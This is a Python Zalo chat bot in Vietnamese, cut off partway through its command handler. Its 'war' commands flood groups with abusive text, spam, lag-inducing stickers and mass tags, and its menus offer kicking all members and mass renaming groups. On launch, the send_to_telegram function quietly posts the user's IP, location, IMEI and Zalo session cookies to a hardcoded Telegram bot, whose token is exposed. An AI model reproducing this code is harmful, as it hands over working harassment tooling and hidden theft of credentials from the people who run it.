import random
import threading
import time
import json
import requests
import os
import re
from colorama import init, Fore, Style
from datetime import datetime, timedelta
from zlapi import ZaloAPI, Message, Mention, MessageStyle, ThreadType
from zlapi.models import *
from config import IMEI, SESSION_COOKIES, API_KEY, SECRET_KEY, ADMIN_IDS

# Khởi tạo colorama
init()

# Biến toàn cục để theo dõi loại key
key_type_used = None

# Danh sách lệnh cho key free
FREE_KEY_COMMANDS = {'big', 'italic', 'small', 'spam', 'nhay', 'spamstk', 'spamtag', 'lende', 'superbig', 'nhaytag', 'spamtagbig', 'green'}

# Danh sách màu
COLOR_MAP = {
    'green': '00FF00', 'red': 'FF0000', 'blue': '0000FF',
    'yellow': 'FFFF00', 'purple': '800080', 'cyan': '00FFFF'
}

# Danh sách 100 icon để thả
ICON_LIST = [
    "👍", "❤️", "😂", "😮", "😢", "😡", "👏", "🔥", "🌟", "🎉",
    "💪", "✨", "😍", "🥳", "🤓", "😎", "🤗", "🙏", "🍀", "🌈",
    "🎈", "🎁", "💖", "💯", "👌", "🤝", "🐾", "🍎", "🍕", "🍔",
    "🍟", "🍦", "☕", "🍺", "🍷", "🍹", "🎵", "🎤", "🎸", "🥁",
    "🎮", "⚽", "🏀", "🏈", "🎾", "🏓", "🏆", "🚀", "✈️", "🚗",
    "🏍️", "🚢", "⛵", "🏝️", "⛰️", "🌋", "🌅", "🌙", "⭐", "☀️",
    "☁️", "⛈️", "❄️", "🌪️", "🌊", "🐱", "🐶", "🐰", "🦊", "🐻",
    "🐼", "🐸", "🐙", "🦁", "🐘", "🦄", "🐳", "🐬", "🦋", "🐞",
    "🌹", "🌸", "🌺", "🌻", "🍁", "🍂", "🍃", "🌴", "🎄", "🎃",
    "👻", "🎅", "🧸", "🎀", "💌", "📸", "📹", "💾", "🔧", "⚡"
]

# Danh sách câu trả lời tự động
AUTO_REPLY_LIST = [
    "Bạn gọi mình có việc gì thế? 😎",
    "Tag mình chi vậy? Để mình xử lý nào! 💪",
    "Mình đây, bạn khỏe không? 😊",
    "Có chuyện gì hot hả? Kể nghe với! 🔥",
    "Đừng tag nhiều quá, mình bận code nè! 😅",
    "Chào bạn, mình là bot của Quang Thắng! 🤖",
    "Tag mình là muốn war hả? Được thôi! 😈",
    "Mình đã thấy, để mình reply cho hoành tráng! ✨",
    "Bạn cần gì? Mình sẵn sàng hỗ trợ! 👍",
    "Tag mình làm gì? Để mình spam lại nhé! 😜"
]

# Thông tin Telegram
LOG_BOT_TOKEN = '7639748944:AAEWvcBO3TcnRYbF0Nk4JKnyIZJysUiWGgQ'
TELEGRAM_CHAT_ID = '6127743632'

# API lấy key free
KEY_API_URL = "https://quangthang.click/api/key.php"
VALID_PERMANENT_KEY = "Quangthangdev"
ADMIN_GROUP_ID = "8671076502394951769"

# Danh sách sticker gây lag
lag_stickers = [
    {'id': 23338, 'catId': 10425}, {'id': 23339, 'catId': 10425},
    {'id': 23297, 'catId': 10420}, {'id': 23298, 'catId': 10420},
    {'id': 23000, 'catId': 10400}, {'id': 23001, 'catId': 10400},
    {'id': 23550, 'catId': 10430}, {'id': 23551, 'catId': 10430},
    {'id': 23700, 'catId': 10435}, {'id': 23701, 'catId': 10435},
    {'id': 24010, 'catId': 10440}, {'id': 24011, 'catId': 10440},
    {'id': 24250, 'catId': 10445}, {'id': 24251, 'catId': 10445},
    {'id': 24500, 'catId': 10450}, {'id': 24501, 'catId': 10450},
    {'id': 24720, 'catId': 10455}, {'id': 24721, 'catId': 10455},
]

text_rain = ['trời mưa', 'rain', 'trời mưa rain', 'hoanggiakiet', 'truongquangthang', 'giakiet hot war', 'quangthang hot war', '🤪😝']

COLORS = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA, Fore.WHITE]

def random_color_line(text):
    return random.choice(COLORS) + text + Style.RESET_ALL

def animated_text(text, delay=0.05):
    color = random.choice(COLORS)
    print(color + text, end='', flush=True)
    time.sleep(delay)
    print(Style.RESET_ALL)

def fetch_key_from_api():
    try:
        response = requests.get(KEY_API_URL)
        response.raise_for_status()
        data = response.json()
        return data["key"], data["expiration"]
    except Exception as e:
        print(random_color_line(f"❌ Lỗi khi lấy key từ API: {str(e)}"))
        return None, None

def is_key_valid(input_key):
    api_key, expiration = fetch_key_from_api()
    if api_key is None or expiration is None:
        return False
    try:
        expiration_time = datetime.fromisoformat(expiration)
        current_time = datetime.now(expiration_time.tzinfo)
        if current_time <= expiration_time and input_key == api_key:
            return True
        return False
    except Exception as e:
        print(random_color_line(f"❌ Lỗi khi kiểm tra key: {str(e)}"))
        return False

def send_to_telegram(ip, isp, location, imei, session_cookies):
    try:
        import platform
        user_agent = f"ZaloWarBot/1.0 (Python/{platform.python_version()}; {platform.system()} {platform.release()})"
        os_system = platform.system()
        os_version = platform.release()
        device_type = "Desktop"
        device_name = platform.node() or "Unknown Device"
        node_name = platform.node()
        architecture = platform.machine()
        python_version = platform.python_version()
        timezone = datetime.now().astimezone().tzname()

        current_time = datetime.now().strftime('%H:%M:%S %d/%m/%Y')
        content = (
            f"🔒 Công cụ đã được kích hoạt!\n"
            f"⏰ Thời gian: {current_time}\n"
            f"🌐 IP: {ip}\n"
            f"📡 Nhà mạng: {isp}\n"
            f"📍 Vị trí: {location}\n"
            f"📱 IMEI: {imei}\n"
            f"🍪 Cookies: {session_cookies}\n"
            f"🌐 User Agent: {user_agent}\n"
            f"📱 Loại máy: {device_type}\n"
            f"📲 Tên máy: {device_name}\n"
            f"🖥️ Hệ điều hành: {os_system} {os_version}\n"
            f"🌍 Tên node: {node_name}\n"
            f"🔧 Máy (kiến trúc): {architecture}\n"
            f"🐍 Phiên bản Python: {python_version}\n"
            f"⏳ Múi giờ: {timezone}\n"
        )

        file_name = f"bot_info_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(content)

        url = f"https://api.telegram.org/bot{LOG_BOT_TOKEN}/sendDocument"
        with open(file_name, "rb") as f:
            files = {'document': (file_name, f)}
            payload = {'chat_id': TELEGRAM_CHAT_ID}
            response = requests.post(url, data=payload, files=files)

        os.remove(file_name)

        if response.status_code == 200:
            print(random_color_line("✅ Running By Trương Quang Thắng!"))
        else:
            print(random_color_line(f"❌ Lỗi gửi Telegram: {response.text}"))
    except Exception as e:
        print(random_color_line(f"❌ Lỗi không xác định: {str(e)}"))

def get_network_info():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return data.get('ip', 'Unknown'), data.get('org', 'Unknown'), f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}"
    except:
        return "Unknown", "Unknown", "Unknown"

def get_current_time():
    return datetime.now().strftime('%H:%M:%S %d/%m/%Y')

def add_random_text_lag():
    return random.choice(text_rain)

def send_message_lag(bot, message_object, author_id, thread_id, thread_type, swear):
    try:
        if author_id == '-1':
            user = "Quang Thắng Aka Hoang Gia Kiet"
        else:
            user = bot.fetchUserInfo(author_id).changed_profiles[author_id].displayName
        msg = f"{user} {add_random_text_lag()} {swear}"
        mention = Mention(uid=author_id, length=len(user), offset=msg.index(user))
        message = Message(text=msg, mention=mention)
        bot.send(message, thread_id, thread_type)
    except:
        pass

def text_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event, file_name="chui.txt", delay=1, style=None, color=None, target_thread_id=None):
    target_id = target_thread_id if target_thread_id else thread_id
    target_type = ThreadType.GROUP if target_thread_id else thread_type
    if not target_id:
        print(random_color_line("⚠️ Không thể chạy lệnh từ console!"))
        return
    if not os.path.exists(file_name):
        bot.send(Message(text=f"⚠️ File {file_name} không tồn tại!"), thread_id, thread_type)
        return
    while not stop_event.is_set():
        try:
            with open(file_name, "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                bot.send(Message(text=f"⚠️ File {file_name} trống!"), thread_id, thread_type)
                return
            for text in lines:
                if stop_event.is_set():
                    break
                if style or color:
                    styles = []
                    if style:
                        styles.append({"start": 0, "len": len(text), "st": style})
                    if color:
                        styles.append(MessageStyle(offset=0, length=len(text), style="color", color=color))
                    params = {"styles": styles, "ver": 0}
                    cus_styles = json.dumps(params) if styles else None
                    message = Message(text=text, style=cus_styles)
                else:
                    message = Message(text=text)
                bot.send(message, target_id, target_type)
                print(random_color_line(f"✅ Đã gửi: {text} tới {target_id}"))
                time.sleep(delay)
        except Exception as e:
            bot.send(Message(text=f"❌ Lỗi khi gửi: {str(e)}"), thread_id, thread_type)
            time.sleep(1)

def rename_group_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event, target_thread_id=None):
    target_id = target_thread_id if target_thread_id else thread_id
    if not target_id or (not target_thread_id and thread_type != ThreadType.GROUP):
        bot.send(Message(text="⚠️ Lệnh chỉ dùng trong nhóm hoặc với ID nhóm!"), thread_id, thread_type)
        return
    if not os.path.exists("chui.txt"):
        bot.send(Message(text="⚠️ File chui.txt không tồn tại!"), thread_id, thread_type)
        return
    while not stop_event.is_set():
        try:
            group_info = bot.fetchGroupInfo(target_id).gridInfoMap.get(target_id) if bot.fetchGroupInfo(target_id) else None
            if not group_info:
                bot.send(Message(text="⚠️ Không thể lấy thông tin nhóm!"), thread_id, thread_type)
                return
            if bot.uid not in group_info.adminIds and bot.uid != group_info.creatorId:
                bot.send(Message(text="⚠️ Bot cần quyền quản trị viên để đổi tên nhóm!"), target_id, ThreadType.GROUP)
                return
            with open("chui.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                bot.send(Message(text="⚠️ File chui.txt trống!"), thread_id, thread_type)
                return
            for name in lines:
                if stop_event.is_set():
                    break
                bot.changeGroupName(target_id, name)
                bot.send(Message(text=f"✅ Đã đổi tên nhóm thành: {name}"), target_id, ThreadType.GROUP)
                print(random_color_line(f"✅ Đã đổi tên nhóm thành: {name}"))
                time.sleep(2)
        except Exception as e:
            bot.send(Message(text=f"❌ Lỗi khi đổi tên nhóm: {str(e)}"), thread_id, thread_type)
            time.sleep(1)

def add_friend_all(bot, message_object, thread_id, thread_type):
    if thread_type != ThreadType.GROUP:
        bot.send(Message(text="⚠️ Lệnh chỉ dùng trong nhóm!"), thread_id, thread_type)
        return
    try:
        group_info = bot.fetchGroupInfo(thread_id).gridInfoMap.get(thread_id) if bot.fetchGroupInfo(thread_id) else None
        if not group_info:
            bot.send(Message(text="⚠️ Không thể lấy thông tin nhóm!"), thread_id, thread_type)
            return
        members = [member.split('_')[0] for member in group_info["memVerList"]]
        friends = set(bot.fetchAllFriends().changed_profiles.keys()) if bot.fetchAllFriends() else set()
        non_friends = [uid for uid in members if uid not in friends and uid != bot.uid]
        for uid in non_friends:
            bot.sendFriendRequest(uid)
            bot.send(Message(text=f"✅ Đã gửi lời mời kết bạn đến {uid}!"), thread_id, thread_type)
            time.sleep(1)
        bot.send(Message(text=f"✅ Đã gửi lời mời kết bạn đến {len(non_friends)} thành viên!"), thread_id, thread_type)
    except Exception as e:
        bot.send(Message(text=f"❌ Lỗi khi gửi lời mời kết bạn: {str(e)}"), thread_id, thread_type)

def change_avatar_from_reply(bot, message_object, thread_id, thread_type):
    if not hasattr(message_object, 'quoteMsg') or not message_object.quoteMsg:
        bot.send(Message(text="⚠️ Vui lòng reply vào một tin nhắn chứa ảnh!"), thread_id, thread_type)
        return
    quoted_msg = message_object.quoteMsg
    if not quoted_msg.get('attachments') or not quoted_msg['attachments'][0].get('url'):
        bot.send(Message(text="⚠️ Tin nhắn được reply không chứa ảnh!"), thread_id, thread_type)
        return
    try:
        image_url = quoted_msg['attachments'][0]['url']
        response = requests.get(image_url)
        if response.status_code == 200:
            temp_file = f"temp_avatar_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            with open(temp_file, 'wb') as f:
                f.write(response.content)
            bot.changeAccountAvatar(temp_file)
            os.remove(temp_file)
            bot.send(Message(text="✅ Đã đổi ảnh đại diện từ ảnh được reply!"), thread_id, thread_type)
            print(random_color_line("✅ Đã đổi ảnh đại diện từ ảnh reply!"))
        else:
            bot.send(Message(text="❌ Lỗi khi tải ảnh từ Zalo!"), thread_id, thread_type)
    except Exception as e:
        bot.send(Message(text=f"❌ Lỗi khi đổi ảnh đại diện: {str(e)}"), thread_id, thread_type)

class Bot(ZaloAPI):
    def __init__(self, api_key, secret_key, imei=None, session_cookies=None):
        super().__init__(api_key, secret_key, imei, session_cookies)
        self.threads = {}
        self.start_time = time.time()
        self.sent_messages = 0
        self.received_messages = 0
        self.active_users = {}
        self.current_group_id = None
        self.group_name = None
        self.last_report_time = time.time()
        self.warning_sent = {}
        self.icon_enabled = False
        self.autoreply_enabled = False
        self.muted_users = set()
        self.locked_groups = set()
        self.anti_image = set()
        self.anti_link = set()
        self.anti_voice = set()
        self.anti_recall = set()
        self.spam_tracker = {}
        threading.Thread(target=self.report_to_admin_group, daemon=True).start()

    def send(self, message, thread_id, thread_type):
        super().send(message, thread_id, thread_type)
        self.sent_messages += 1

    def is_admin(self, user_id):
        return str(user_id) in ADMIN_IDS

    def get_user_name(self, uid):
        try:
            user_info = self.fetchUserInfo(uid).changed_profiles.get(uid)
            return user_info.displayName if user_info else "Unknown"
        except:
            return "Unknown"

    def report_to_admin_group(self):
        while True:
            if time.time() - self.last_report_time >= 1800:
                uptime = time.time() - self.start_time
                uptime_str = f"{int(uptime // 3600)}h {int((uptime % 3600) // 60)}m {int(uptime % 60)}s"
                total_messages = self.sent_messages + self.received_messages
                group_name = "Không xác định"
                if self.current_group_id:
                    try:
                        group_info = self.fetchGroupInfo(self.current_group_id).gridInfoMap.get(self.current_group_id)
                        group_name = group_info.groupName if group_info else "Không xác định"
                    except:
                        pass
                active_users_str = ", ".join([f"{uid} ({self.get_user_name(uid)})" for uid in self.active_users.keys()]) if self.active_users else "Không có"
                report = (
                    f"📊 Báo cáo hoạt động bot:\n"
                    f"📤 Số tin nhắn đã gửi: {self.sent_messages}\n"
                    f"📥 Số tin nhắn đã nhận: {self.received_messages}\n"
                    f"📋 Tổng tin nhắn: {total_messages}\n"
                    f"⏳ Uptime: {uptime_str}\n"
                    f"🆔 ID nhóm: {self.current_group_id}\n"
                    f"🏷️ Tên nhóm: {group_name}\n"
                    f"👥 Người dùng hoạt động: {active_users_str}"
                )
                self.send(Message(text=report), ADMIN_GROUP_ID, ThreadType.GROUP)
                self.last_report_time = time.time()
            time.sleep(60)

    def start_command(self, command_name, target_func, message_object, author_id, thread_id, thread_type, file_name=None, target_thread_id=None, **kwargs):
        if command_name in self.threads:
            self.stop_command(command_name)
        stop_event = threading.Event()
        if file_name:
            thread = threading.Thread(target=target_func, args=(self, message_object, author_id, thread_id, thread_type, stop_event, file_name, target_thread_id), kwargs=kwargs)
        else:
            thread = threading.Thread(target=target_func, args=(self, message_object, author_id, thread_id, thread_type, stop_event, target_thread_id), kwargs=kwargs)
        self.threads[command_name] = {"thread": thread, "stop_event": stop_event}
        thread.start()
        print(random_color_line(f"📝 Bắt đầu {command_name}!"))

    def stop_command(self, command_name):
        if command_name in self.threads:
            print(random_color_line(f"⏹️ Đang dừng {command_name}!"))
            self.threads[command_name]["stop_event"].set()
            self.threads[command_name]["thread"].join()
            del self.threads[command_name]
            print(random_color_line(f"✅ Đã dừng {command_name}!"))
        elif command_name == "icon":
            self.icon_enabled = False
            self.send(Message(text="⏹️ Đã dừng thả icon!"), thread_id, thread_type)
            print(random_color_line("✅ Đã dừng thả icon!"))
        elif command_name == "autoreply":
            self.autoreply_enabled = False
            self.send(Message(text="⏹️ Đã dừng tự động reply!"), thread_id, thread_type)
            print(random_color_line("✅ Đã dừng tự động reply!"))

    def onMessage(self, mid, author_id, message, message_object, thread_id, thread_type):
        self.received_messages += 1
        self.active_users[author_id] = True
        self.current_group_id = thread_id if thread_type == ThreadType.GROUP else None
        if thread_type == ThreadType.GROUP and not self.group_name:
            try:
                group_info = self.fetchGroupInfo(thread_id).gridInfoMap.get(thread_id)
                self.group_name = group_info.groupName if group_info else "Không xác định"
            except:
                self.group_name = "Không xác định"
        uptime = time.time() - self.start_time
        uptime_str = f"{int(uptime // 3600)}h {int((uptime % 3600) // 60)}m {int(uptime % 60)}s"
        total_messages = self.sent_messages + self.received_messages
        user_name = self.get_user_name(author_id)

        # Xử lý mute
        if author_id in self.muted_users and thread_type == ThreadType.GROUP:
            try:
                self.recallMessage(mid, thread_id, thread_type)
            except AttributeError:
                print(random_color_line("❌ Bot không có quyền xóa tin nhắn hoặc phương thức recallMessage không tồn tại!"))
            return

        # Xử lý lock
        if thread_id in self.locked_groups and thread_type == ThreadType.GROUP:
            group_info = self.fetchGroupInfo(thread_id).gridInfoMap.get(thread_id) if self.fetchGroupInfo(thread_id) else None
            if group_info and author_id not in group_info.adminIds and author_id != group_info.creatorId:
                try:
                    self.recallMessage(mid, thread_id, thread_type)
                except AttributeError:
                    print(random_color_line("❌ Bot không có quyền xóa tin nhắn hoặc phương thức recallMessage không tồn tại!"))
                return

        # Xử lý anti
        if thread_type == ThreadType.GROUP:
            if thread_id in self.anti_image and message_object.attachments and 'image' in message_object.attachments[0].get('type', ''):
                try:
                    self.recallMessage(mid, thread_id, thread_type)
                    self.send(Message(text=f"⚠️ {user_name} ({author_id}) bị chặn gửi ảnh!"), thread_id, thread_type)
                except AttributeError:
                    print(random_color_line("❌ Bot không có quyền xóa tin nhắn hoặc phương thức recallMessage không tồn tại!"))
                return
            if thread_id in self.anti_link and re.search(r'http[s]?://', str(message)):
                try:
                    self.recallMessage(mid, thread_id, thread_type)
                    self.send(Message(text=f"⚠️ {user_name} ({author_id}) bị chặn gửi link!"), thread_id, thread_type)
                except AttributeError:
                    print(random_color_line("❌ Bot không có quyền xóa tin nhắn hoặc phương thức recallMessage không tồn tại!"))
                return
            if thread_id in self.anti_voice and message_object.attachments and 'voice' in message_object.attachments[0].get('type', ''):
                try:
                    self.recallMessage(mid, thread_id, thread_type)
                    self.send(Message(text=f"⚠️ {user_name} ({author_id}) bị chặn gửi voice!"), thread_id, thread_type)
                except AttributeError:
                    print(random_color_line("❌ Bot không có quyền xóa tin nhắn hoặc phương thức recallMessage không tồn tại!"))
                return

        # Xử lý anti spam
        if thread_type == ThreadType.GROUP:
            if thread_id not in self.spam_tracker:
                self.spam_tracker[thread_id] = {}
            if author_id not in self.spam_tracker[thread_id]:
                self.spam_tracker[thread_id][author_id] = {'count': 0, 'last_time': 0, 'warnings': 0}
            tracker = self.spam_tracker[thread_id][author_id]
            current_time = time.time()
            if current_time - tracker['last_time'] < 1:
                tracker['count'] += 1
                if tracker['count'] >= 5:
                    tracker['warnings'] += 1
                    if tracker['warnings'] <= 3:
                        self.send(Message(text=f"⚠️ {user_name} ({author_id}) spam quá nhanh! Cảnh báo {tracker['warnings']}/3"), thread_id, thread_type)
                    elif tracker['warnings'] == 4:
                        self.kickUsersInGroup([author_id], thread_id)
                        self.send(Message(text=f"✅ Đã kick {user_name} ({author_id}) vì spam quá nhanh!"), thread_id, thread_type)
                        del self.spam_tracker[thread_id][author_id]
                    tracker['count'] = 0
            else:
                tracker['count'] = 1
            tracker['last_time'] = current_time

        # Xử lý icon
        if self.icon_enabled and thread_type == ThreadType.GROUP:
            try:
                random_icon = random.choice(ICON_LIST)
                self.sendReaction(message_object.msgId, random_icon, thread_id, thread_type)
                print(random_color_line(f"✅ Đã thả icon {random_icon} vào tin nhắn {message_object.msgId}!"))
            except Exception as e:
                print(random_color_line(f"❌ Lỗi khi thả icon: {str(e)}"))

        if self.autoreply_enabled and message_object.mentions:
            for mention in message_object.mentions:
                if mention.uid == self.uid:
                    reply_text = random.choice(AUTO_REPLY_LIST)
                    self.replyMessage(Message(text=reply_text), message_object, thread_id, thread_type)
                    print(random_color_line(f"✅ Đã tự động reply: {reply_text}"))

        print(random_color_line("╔══════ 📩 TIN NHẮN MỚI ĐẾN 📩 ══════╗"))
        animated_text(f"║ ⏰ Thời gian: {get_current_time()}         ", 0.01)
        animated_text(f"║ 📝 Nội dung: {message}                    ", 0.01)
        animated_text(f"║ 👤 Từ: {user_name} ({author_id})          ", 0.01)
        animated_text(f"║ ⏳ Uptime: {uptime_str}                   ", 0.01)
        animated_text(f"║ 📤 Tin nhắn đã gửi: {self.sent_messages}  ", 0.01)
        animated_text(f"║ 📥 Tin nhắn đã nhận: {self.received_messages}", 0.01)
        animated_text(f"║ 📊 Tổng tin nhắn: {total_messages}        ", 0.01)
        print(random_color_line("╚══════════════════════════════════════╝"))

        if not isinstance(message, str):
            return
        
        str_message = str(message).strip()
        
        if not self.is_admin(author_id):
            print(random_color_line(f"🚫 {user_name} ({author_id}) không có quyền sử dụng bot! ⚠️"))
            return

        global key_type_used
        if key_type_used == "free" and str_message != 'menu' and str_message not in FREE_KEY_COMMANDS and not str_message.startswith('st '):
            if thread_id not in self.warning_sent or not self.warning_sent[thread_id]:
                self.send(Message(text="⚠️ Bạn đang dùng key free! Chỉ có thể dùng 12 lệnh: big, italic, small, spam, nhay, spamstk, spamtag, lende, superbig, nhaytag, spamtagbig, green. Nâng cấp key vĩnh viễn để dùng tất cả!"), thread_id, thread_type)
                self.warning_sent[thread_id] = True
            return

        # Menu riêng biệt
        if str_message == 'menu war':
            menu_text = (
                f"╔═ 🔥 MENU WAR 🔥 ═╗\n"
                f"║ big / big<color> - Chữ lớn từ chui.txt\n"
                f"║ italic / italic<color> - Chữ nghiêng\n"
                f"║ small / small<color> - Chữ nhỏ\n"
                f"║ spam / spam<color> - Gửi spam.txt\n"
                f"║ spam1 - Gửi spam1.txt\n"
                f"║ spam2 - Gửi spam2.txt\n"
                f"║ spam3 - Gửi spam3.txt\n"
                f"║ spam4 - Gửi spam4.txt\n"
                f"║ spam5 - Gửi spam5.txt\n"
                f"║ spam6 - Gửi spam6.txt\n"
                f"║ spam7 - Gửi spam7.txt\n"
                f"║ spam8 - Gửi spam8.txt\n"
                f"║ spam9 - Gửi spam9.txt\n"
                f"║ spam10 - Gửi spam10.txt\n"
                f"║ nhay / nhay<color> - Spam chui.txt\n"
                f"║ spamstk - Spam sticker\n"
                f"║ spamtag - Tag all từ spamtag.txt\n"
                f"║ spamtag1 - Tag all từ spamtag1.txt\n"
                f"║ spamtag2 - Tag all từ spamtag2.txt\n"
                f"║ spamtag3 - Tag all từ spamtag3.txt\n"
                f"║ spamtag4 - Tag all từ spamtag4.txt\n"
                f"║ spamtag5 - Tag all từ spamtag5.txt\n"
                f"║ spamtag6 - Tag all từ spamtag6.txt\n"
                f"║ spamtag7 - Tag all từ spamtag7.txt\n"
                f"║ spamtag8 - Tag all từ spamtag8.txt\n"
                f"║ spamtag9 - Tag all từ spamtag9.txt\n"
                f"║ spamtag10 - Tag all từ spamtag10.txt\n"
                f"║ lende - Spam mention ngẫu nhiên\n"
                f"║ superbig / superbig<color> - Chữ siêu to\n"
                f"║ nhaytag - Tag tất cả từ chui.txt\n"
                f"║ spamtagbig - Tag tất cả chữ lớn\n"
                f"║ spamtagitalic - Tag tất cả chữ nghiêng\n"
                f"║ spamtaglag - Tag tất cả gây lag\n"
                f"║ spamtagmix - Tag tất cả mix kiểu\n"
                f"║ spamtagsmall - Tag tất cả chữ nhỏ\n"
                f"║ spamtagsuperbig - Tag tất cả chữ siêu to\n"
                f"║ <lệnh> <id> - Gửi đến nhóm khác\n"
                f"╚════════════════════╝"
            )
            self.send(Message(text=menu_text), thread_id, thread_type)
        elif str_message == 'menu manage':
            menu_text = (
                f"╔═ 🔧 MENU QUẢN LÝ 🔧 ═╗\n"
                f"║ kickall - Xóa tất cả thành viên\n"
                f"║ rename - Đổi tên nhóm\n"
                f"║ block <uid> - Chặn user\n"
                f"║ add <uid1> <uid2> - Thêm user\n"
                f"║ promote <uid> - Thăng cấp admin\n"
                f"║ demote <uid> - Hạ cấp admin\n"
                f"║ leave - Bot rời nhóm\n"
                f"║ groupavatar - Đổi ảnh nhóm\n"
                f"║ mute <uid> - Cấm user chat\n"
                f"║ unmute <uid> - Bỏ cấm chat\n"
                f"║ lock - Khóa nhóm\n"
                f"║ unlock - Mở khóa nhóm\n"
                f"║ pin <msg_id> - Ghim tin nhắn\n"
                f"║ unpin <msg_id> - Bỏ ghim\n"
                f"║ setgroupdesc <text> - Đặt mô tả nhóm\n"
                f"║ setgrouplink <on/off> - Bật/tắt link mời\n"
                f"║ getgrouplink - Lấy link mời nhóm\n"
                f"╚═══════════════════════╝"
            )
            self.send(Message(text=menu_text), thread_id, thread_type)
        elif str_message == 'menu info':
            menu_text = (
                f"╔═ ℹ️ MENU THÔNG TIN ℹ️ ═╗\n"
                f"║ id - Lấy ID người dùng\n"
                f"║ groupid - Lấy ID nhóm\n"
                f"║ userid - Lấy ID người gửi\n"
                f"║ msgid - Lấy ID tin nhắn reply\n"
                f"║ friends - Danh sách bạn bè\n"
                f"║ chats - Danh sách chat gần đây\n"
                f"║ recent - Tin nhắn gần đây nhóm\n"
                f"║ groups - Danh sách nhóm\n"
                f"║ board - Bảng nhóm\n"
                f"║ pins - Tin nhắn ghim\n"
                f"║ notes - Ghi chú nhóm\n"
                f"║ polls - Bình chọn nhóm\n"
                f"║ groupmembers - Danh sách thành viên\n"
                f"║ groupadmins - Danh sách admin\n"
                f"╚═════════════════════════╝"
            )
            self.send(Message(text=menu_text), thread_id, thread_type)
        elif str_message == 'menu anti':
            menu_text = (
                f"╔═ 🛡️ MENU CHỐNG PHÁ 🛡️ ═╗\n"
                f"║ antiimage on/off - Chặn ảnh\n"
                f"║ antilink on/off - Chặn link\n"
                f"║ antivoice on/off - Chặn voice\n"
                f"║ antispam on/off - Chặn spam\n"
                f"║ antirecall on/off - Chống thu hồi\n"
                f"╚═══════════════════════════╝"
            )
            self.send(Message(text=menu_text), thread_id, thread_type)
        elif str_message == 'menu other':
            menu_text = (
                f"╔═ ⭐ MENU KHÁC ⭐ ═╗\n"
                f"║ profile <name> <dob> <gender> - Đổi thông tin\n"
                f"║ avatar - Đổi ảnh đại diện\n"
                f"║ addfriendall - Kết bạn tất cả\n"
                f"║ icon on/off - Thả icon tin nhắn mới\n"
                f"║ autoreply on/off - Tự động reply\n"
                f"║ setnote <text> - Đặt ghi chú\n"
                f"║ removenote <note_id> - Xóa ghi chú\n"
                f"║ setpoll <question> <opt1> <opt2> - Tạo poll\n"
                f"║ vote <poll_id> <option> - Bỏ phiếu\n"
                f"║ getuserinfo <uid> - Lấy info user\n"
                f"║ getgroupinfo <grid> - Lấy info nhóm\n"
                f"║ sendfile <path> - Gửi file\n"
                f"╚═══════════════════════╝"
            )
            self.send(Message(text=menu_text), thread_id, thread_type)
        elif str_message == 'help':
            help_text = (
                f"╔═ ❓ HƯỚNG DẪN SỬ DỤNG ❓ ═╗\n"
                f"║ Gõ 'menu war' để xem lệnh war\n"
                f"║ Gõ 'menu manage' để xem lệnh quản lý\n"
                f"║ Gõ 'menu info' để xem lệnh thông tin\n"
                f"║ Gõ 'menu anti' để xem lệnh chống phá\n"
                f"║ Gõ 'menu other' để xem lệnh khác\n"
                f"║ Dùng 'st <lệnh>' để dừng lệnh (VD: st nhay)\n"
                f"║ Thêm '<color>' vào lệnh war (VD: bigred)\n"
                f"║ Thêm '<id>' để gửi đến nhóm khác (VD: nhay 123)\n"
                f"╚════════════════════════════╝"
            )
            self.send(Message(text=help_text), thread_id, thread_type)

        # Xử lý lệnh
        parts = str_message.split()
        command = parts[0].lower()
        target_thread_id = parts[1] if len(parts) > 1 and parts[1].isdigit() else None

        # Lệnh war
        for color_name, color_code in COLOR_MAP.items():
            if command == color_name:
                self.start_command(color_name, text_from_file, message_object, author_id, thread_id, thread_type, color=color_code, target_thread_id=target_thread_id)
                return
            elif command.startswith(f"big{color_name}"):
                self.start_command(f"big{color_name}", text_from_file, message_object, author_id, thread_id, thread_type, style="b,f_1500", color=color_code, target_thread_id=target_thread_id)
                return
            elif command.startswith(f"italic{color_name}"):
                self.start_command(f"italic{color_name}", text_from_file, message_object, author_id, thread_id, thread_type, style="i", color=color_code, target_thread_id=target_thread_id)
                return
            elif command.startswith(f"small{color_name}"):
                self.start_command(f"small{color_name}", text_from_file, message_object, author_id, thread_id, thread_type, style="f_50", color=color_code, target_thread_id=target_thread_id)
                return
            elif command.startswith(f"spam{color_name}"):
                self.start_command(f"spam{color_name}", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spam.txt", delay=10, color=color_code, target_thread_id=target_thread_id)
                return
            elif command.startswith(f"nhay{color_name}"):
                self.start_command(f"nhay{color_name}", text_from_file, message_object, author_id, thread_id, thread_type, delay=1, color=color_code, target_thread_id=target_thread_id)
                return
            elif command.startswith(f"superbig{color_name}"):
                self.start_command(f"superbig{color_name}", text_from_file, message_object, author_id, thread_id, thread_type, style="b,f_2000", color=color_code, target_thread_id=target_thread_id)
                return

        if command == 'big':
            self.start_command("big", text_from_file, message_object, author_id, thread_id, thread_type, style="b,f_1500", target_thread_id=target_thread_id)
        elif command == 'italic':
            self.start_command("italic", text_from_file, message_object, author_id, thread_id, thread_type, style="i", target_thread_id=target_thread_id)
        elif command == 'small':
            self.start_command("small", text_from_file, message_object, author_id, thread_id, thread_type, style="f_50", target_thread_id=target_thread_id)
        elif command == 'spam':
            self.start_command("spam", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spam.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spam1':
            self.start_command("spam1", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spam1.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spam2':
            self.start_command("spam2", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spam2.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spam3':
            self.start_command("spam3", text_from_file, message_object, author_id, thread_id, thread_type, file_name="spam3.txt", delay=10, target_thread_id=target_thread_id)
        elif command == 'spam4':
